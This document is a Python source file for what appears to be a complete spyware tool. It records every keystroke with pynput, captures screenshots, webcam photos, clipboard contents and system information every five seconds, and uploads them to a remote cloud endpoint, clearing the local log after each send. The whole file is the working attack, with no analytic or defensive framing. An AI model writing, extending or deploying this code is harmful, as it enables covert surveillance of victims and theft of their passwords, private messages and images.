import os
import threading
import time
import requests
from pynput import keyboard
from config import LOG_FILE, CLOUD_ENDPOINT
from utils.clipboard import get_clipboard_data
from utils.system_info import get_system_info
from utils.screenshot import take_screenshot
from utils.webcam import capture_webcam_photo

# Ensure logs folder exists
os.makedirs("logs", exist_ok=True)

# Keylogging
def on_press(key):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f" [{key}] ")

# Function to send data to the cloud
def send_logs_to_cloud():
    while True:
        # Capture data first, then send immediately
        print("📸 Capturing data...")
        
        # Read keylog data if exists
        keylog_data = ""
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                keylog_data = f.read()

        # Capture screenshot and webcam
        screenshot_path = take_screenshot()
        webcam_path = capture_webcam_photo()
        clipboard = get_clipboard_data()
        system_info = get_system_info()

        # Prepare payload
        files = {}
        if screenshot_path and os.path.exists(screenshot_path):
            files["screenshot"] = open(screenshot_path, "rb")
        if webcam_path and os.path.exists(webcam_path):
            files["webcam"] = open(webcam_path, "rb")

        data = {
            "keylog": keylog_data,
            "clipboard": clipboard,
            "system_info": system_info
        }

        # Try sending with retry logic
        max_retries = 2
        for attempt in range(max_retries):
            try:
                if attempt > 0:
                    print(f"🔄 Retry attempt {attempt + 1}/{max_retries}...")
                print("📤 Sending to cloud...")
                response = requests.post(CLOUD_ENDPOINT, data=data, files=files, timeout=60)
                print("✅ Sent to cloud:", response.text)
                # Clear keylog after successful send
                if keylog_data:
                    open(LOG_FILE, "w").close()
                break  # Success, exit retry loop
            except requests.exceptions.Timeout:
                print(f"⏱️ Timeout on attempt {attempt + 1}/{max_retries}")
                if attempt == max_retries - 1:
                    print("❌ All retry attempts failed - server may be waking up")
            except Exception as e:
                print(f"❌ Error sending logs: {e}")
                break  # Don't retry on other errors
            finally:
                # Reset file pointers for retry
                if attempt < max_retries - 1:
                    if "screenshot" in files: files["screenshot"].seek(0)
                    if "webcam" in files: files["webcam"].seek(0)
        
        # Close files after all attempts
        if "screenshot" in files: files["screenshot"].close()
        if "webcam" in files: files["webcam"].close()
        
        # Wait 5 seconds before next capture
        print("⏳ Waiting 5 seconds...\n")
        time.sleep(5)

# Threads
threading.Thread(target=send_logs_to_cloud, daemon=True).start()

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
